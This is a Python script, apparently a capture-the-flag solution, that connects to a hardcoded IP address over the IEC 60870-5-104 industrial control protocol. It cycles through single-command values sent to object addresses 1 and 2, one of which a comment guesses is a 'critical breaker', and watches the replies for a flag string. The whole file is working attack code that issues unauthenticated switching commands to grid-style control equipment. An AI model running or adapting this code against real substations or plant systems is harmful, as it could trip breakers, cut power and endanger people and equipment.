#!/usr/bin/env python3
import socket
import time

HOST = '169.58.126.107'
PORT = 6004

def main():
    s = socket.socket()
    s.settimeout(300)
    try:
        s.connect((HOST, PORT))
        # STARTDT
        s.send(bytes([0x68, 0x04, 0x07, 0x00, 0x00, 0x00]))
        time.sleep(2)
        r = s.recv(1024)
        print(r.hex())
        
        ca = bytes([0x01, 0x00])
        
        # Try different SCO values for IOA 1 (critical breaker?)
        # Try direct operate (S/E bit 7 = 1)
        for sco in [0x01, 0x00, 0x81, 0x80, 0x02, 0x82]:
            ioa = bytes([0x01, 0x00, 0x00])
            asdu = bytes([45, 0x01, 0x06]) + ca + ioa + bytes([sco])
            s.send(bytes([0x68, len(asdu)+4, 0x00,0x00,0x00,0x00]) + asdu)
            print(f'Sent SCO {hex(sco)} to IOA1')
            time.sleep(1)
            try:
                r = s.recv(512)
                if r: print('  ', r.hex())
            except:
                pass
        
        # Try IOA 2
        for sco in [0x01, 0x00, 0x81, 0x80]:
            ioa = bytes([0x02, 0x00, 0x00])
            asdu = bytes([45, 0x01, 0x06]) + ca + ioa + bytes([sco])
            s.send(bytes([0x68, len(asdu)+4, 0x00,0x00,0x00,0x00]) + asdu)
            print(f'Sent SCO {hex(sco)} to IOA2')
            time.sleep(1)
            try:
                r = s.recv(512)
                if r: print('  ', r.hex())
            except:
                pass
        
        print('Waiting...')
        start = time.time()
        while time.time() - start < 90:
            try:
                s.settimeout(10)
                r = s.recv(4096)
                if not r: break
                print(r.hex())
                if b'CTF{' in r:
                    print(r)
                    break
            except:
                try:
                    s.send(bytes([0x68,0x04,0x43,0x00,0x00,0x00]))
                except: pass
                time.sleep(2)
    finally:
        s.close()

if __name__ == '__main__':
    main()
